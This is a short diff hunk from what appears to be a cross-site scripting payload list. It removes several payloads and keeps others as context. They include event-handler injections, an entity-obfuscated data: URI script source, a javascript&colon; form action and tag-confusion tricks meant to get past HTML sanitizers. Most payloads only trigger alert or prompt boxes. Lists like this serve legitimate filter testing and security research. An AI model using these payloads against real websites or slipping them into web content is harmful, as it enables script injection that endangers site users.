@@ -11,14 +11,6 @@
 
 <div/onmouseover='alert(1)'> style="x:">
 
-<--`<img/src=` onerror=alert(1)> --!>
- <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
-
-<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
-
-"><img src=x onerror=window.open('https://www.google.com/');>
-
-<form><button formaction=javascript&colon;alert(1)>CLICKME
 
 
 <? foo="><x foo='?><script>alert(1)</script>'>">
